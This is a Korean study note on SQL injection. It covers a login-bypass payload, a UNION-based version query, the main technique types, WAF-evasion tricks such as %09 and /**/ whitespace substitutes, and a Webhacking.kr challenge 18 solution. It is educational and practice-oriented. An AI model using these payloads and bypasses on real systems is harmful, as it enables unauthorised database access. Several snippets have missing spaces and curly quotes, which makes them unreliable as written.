# SQL Injection

---

## 개요

SQL Injection(약칭 SQLi)은 애플리케이션의 입력값을 통해 악의적인 SQL 문을 삽입하여 데이터베이스 쿼리를 조작하는 공격 기법입니다. 공격자는 이를 통해 데이터 열람, 수정, 삭제, **데이터베이스 관리자 권한 획득**이나 **파일시스템 접근**까지 시도할 수 있습니다.

---

## 기본 예제

- SELECT 예제:

```sql
SELECT * FROM user_tbWHERE ID=‘$id’ and PW=‘$pw’;
```

- 공격자 입력 예시:

```sql
$id = "’ or 1=1 –‘
$pw = 1
```

- 조합된 결과 (주석 사용):

```sql
SELECT * FROM user_tbWHERE ID=‘’ or 1=1 --’ and PW=‘1’;
--: SQL 주석
SELECT * FROM user_tbWHERE ID=‘’ or 1=1
```

---

## 논리값과 결과

- 예시:

```
SELECT * FROM user_tbWHERE FALSE or TRUE
SELECT * FROM user_tbWHERE TRUE
```

- 참/거짓 표기:

> TRUE (참)

TRUE (참)

FALSE (거짓)

---

## 주요 기법(타입)

- UNION SQL Injection
- Error Based SQL Injection
- Blind SQL Injection
- TIME Based SQL Injection

> 특별한 기법이라기보다는 SQL 문을 응용해 장난치는 느낌입니다. DBMS별로 문법 차이가 있어(Oracle, MySQL, MSSQL 등) 여러 DBMS 경험이 있으면 유리합니다. 특히 MySQL에서는 `information_schema`가 중요합니다.

---

## UNION 기반 예시

```sql
SELECTusername FROMcoco_marketing_userWHEREid=''

UNIONSELECTVERSION() # '
```

- 주의: UNION을 사용할 때는 좌/우 SELECT의 컬럼 개수가 일치해야 합니다.

---

## 자동화와 연습

- 하나의 취약점을 발견하면 Python 등으로 자동화 스크립트를 만들어 반복 공격에 사용합니다.
- 다양한 SQL 키워드를 숙지해야 합니다.

---

## WAF 우회 기법 (간단 정리)

1. URL Encoding
   - URL Decoder/Encoder 사용
2. 주석 활용
3. 대소문자 활용
4. 공백 우회 방법 (예: 탭, 개행, URL 인코딩)

예시 토큰:

- `%0a` (개행)
- `%0d` (캐리지 리턴)
- `%09` (탭)
- `/**/` (주석)

---

## 워게임 / 실습 리소스

- Webhacking.kr (운영자: rubiya로 알려짐)
  - 예시 계정: Id / a235  Pw / 1
  - 메모(2016년 1월)
- Wargame.kr
  - already got, QR Code PUZZLE, flee button, login filtering 등

---

## Webhacking.kr - Challenge 18 (요약)

- 취약점 요약: `select id from chall18 where id='guest' and no=$_GET[no]`
- 힌트: No=1 → guest, No=2 → admin
- 우회 예시: `selectidfromchall18whereid='guest'andno=2%09or%09no=2`
  - 여기서 `%09`는 HT(Tab) 문자로 공백 대체 용도

---

## Reference

(원문에서 제공한 참고 자료 및 추가 학습 자료를 여기에 기재할 수 있습니다.)